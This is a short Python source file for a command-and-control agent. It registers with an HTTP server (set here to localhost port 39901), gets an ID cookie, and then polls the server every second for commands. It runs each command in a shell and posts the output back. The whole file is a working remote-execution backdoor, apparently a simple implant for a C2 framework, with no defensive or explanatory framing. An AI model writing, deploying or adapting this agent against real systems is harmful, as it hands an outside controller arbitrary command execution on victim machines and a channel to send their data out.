import subprocess
import requests
import time

id = ""

def handle_error(err):
    if err:
        print(err)
        raise err
        return True
    return False

def handle_command(cmd_str, server):
    if cmd_str == "***NIL***":
        return
    else:
        cmd = subprocess.Popen(cmd_str, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        out, err = cmd.communicate()
        if err:
            err_output = f"{out.decode('utf-8')}\n{err.decode('utf-8')}"
            requests.post(server, data=err_output, headers={'Content-Type': 'text/plain'})
        else:
            requests.post(server, data=out.decode('utf-8'), headers={'Content-Type': 'text/plain'})
        return

def init_agent(server):
    buff = "***INIT***"
    headers = {'Content-Type': 'text/plain'}
    r = requests.post(server, data=buff, headers=headers)
    global id
    for cookie in r.cookies:
        if cookie.name == "ID":
            id = cookie.value
    return

if __name__ == "__main__":
    server = "http://127.0.0.1:39901/"
    init_agent(server)
    print(id)
    cookie = {'ID': id}
    http_client = requests.Session()

    while True:
        buff = ""
        try:
            r = http_client.get(server, cookies=cookie)
            r.raise_for_status()
            buff = r.text
            print(buff)
            handle_command(buff, server)
            time.sleep(1)
        except requests.exceptions.RequestException as err:
            handle_error(err)
